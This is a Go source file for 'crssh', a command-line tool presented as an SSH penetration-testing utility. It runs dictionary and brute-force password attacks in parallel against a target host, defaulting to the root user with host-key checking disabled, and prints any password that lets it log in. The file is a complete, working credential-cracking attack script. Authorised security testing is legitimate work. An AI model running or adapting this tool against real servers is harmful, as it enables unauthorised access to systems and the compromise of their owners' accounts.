package cmd

import (
	"context"
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/hlts2/errgroup"
	"github.com/hlts2/gobf"
	"github.com/hlts2/godict"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
)

const (
	version = "v0.0.1"
)

type passCracker = gobf.BruteForce

var (
	host string
	user string
	port uint
	size uint
)

var (
	strPort string
)

func init() {
	rootCmd.Flags().StringVarP(&user, "user", "u", "root", "set user name")
	rootCmd.Flags().UintVarP(&port, "port", "p", 22, "set port number")
	rootCmd.Flags().UintVarP(&size, "size", "s", 4, "set password size for brute force attack")
}

var rootCmd = &cobra.Command{
	Use:     "crssh",
	Short:   "penetration testing tool for ssh server",
	Version: version,
	Args: func(cmd *cobra.Command, args []string) error {
		if len(args) == 0 {
			return errors.New("requires a host argument")
		}

		h, u, p, _, err := splitUserHostPort(args[0])
		if err != nil {
			return fmt.Errorf("invalid host specified: %w", err)
		}

		if len(h) != 0 {
			host = h
		}
		if len(u) != 0 {
			user = u
		}
		if p != 0 {
			port = p
		}
		strPort = strconv.Itoa(int(port))

		return nil
	},
	RunE: func(cmd *cobra.Command, _ []string) error {
		crackerGens := []func() (passCracker, error){

			// generator for dictionary attack.
			func() (passCracker, error) {
				return godict.New()
			},

			// generator for brute force attack.
			func() (passCracker, error) {
				return gobf.New(
					gobf.WithUpper(true),
					gobf.WithLower(true),
					gobf.WithNumber(true),
					gobf.WithSize(int(size)),
					gobf.WithConcrencyLimit(100000),
				)
			},
		}

		ctx, cancel := context.WithCancel(cmd.Context())
		defer cancel()

		eg, egctx := errgroup.WithContext(ctx)

		for _, crackerGen := range crackerGens {
			crackerGen := crackerGen
			eg.Go(func() error {
				cracker, err := crackerGen()
				if err != nil {
					return err
				}
				return cracker.Do(egctx, func(pass string) {
					config := &ssh.ClientConfig{
						User:            user,
						HostKeyCallback: ssh.InsecureIgnoreHostKey(), // https://github.com/golang/go/issues/19767
						Auth: []ssh.AuthMethod{
							ssh.Password(pass),
						},
					}

					conn, err := ssh.Dial("tcp", host+":"+strPort, config)
					if err != nil {
						return
					}
					defer conn.Close()
					cancel()

					fmt.Printf("Successful connection to ssh server.  password: %s\n", pass)
				})
			})
		}

		err := eg.Wait()
		if errors.Is(err, context.Canceled) {
			return nil
		}

		return err
	},
}

// TODO: Add processing for ipv6.
func splitUserHostPort(str string) (host, user string, port uint, ipv4 bool, err error) {
	uSplit := strings.Split(str, "@")
	switch len(uSplit) {
	case 1: // ["localhost:8080"]
		host = uSplit[0]
	case 2: // ["user", "localhost:8080"]
		user = uSplit[0]
		host = uSplit[1]
	default:
		return "", "", 0, false, fmt.Errorf("%s  too many \"@\" in host", str)
	}

	hSplit := strings.Split(host, ":")
	switch len(hSplit) {
	case 1: // ["localhost"]
		ipv4 = true
	case 2: // ["localhost", "22"]
		ipv4 = true
		host = hSplit[0]
		uport, err := strconv.ParseUint(hSplit[1], 10, 64)
		if err != nil {
			return "", "", 0, false, fmt.Errorf("%s  invalid port number in host", str)
		}
		port = uint(uport)
	}

	return
}

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}
